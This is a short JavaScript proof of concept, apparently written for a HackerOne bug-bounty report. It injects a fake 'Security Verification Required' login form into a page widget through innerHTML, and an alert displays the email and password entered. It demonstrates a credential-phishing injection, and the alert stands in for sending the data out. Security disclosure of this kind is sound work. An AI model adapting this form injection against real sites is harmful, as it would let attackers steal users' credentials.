(function() {
    const target = document.getElementById('livesearch-plp-widget');
    if (!target) return;

    // 使用反引号 (Backticks) 定义多行 HTML 模板
    const formTemplate = `
        <form id="poc-form" style="margin: 20px 0; border: 1px solid red; padding: 10px;">
            <p style="color:red;"><strong>Security Verification Required</strong></p>
            <input type="text" id="poc_email" value="hechneg@wearehackerone.com" style="margin-right:5px;">
            <input type="password" id="poc_pass" placeholder="Password" style="margin-right:5px;">
            <button type="button" onclick="alert('Intercepted:\\nEmail: ' + document.getElementById('poc_email').value + '\\nPass: ' + document.getElementById('poc_pass').value)">Verify</button>
        </form>
    `;

    // 直接注入 HTML 字符串
    target.innerHTML = formTemplate;

    console.log("PoC Form injected via innerHTML into #livesearch-plp-widget");
})();
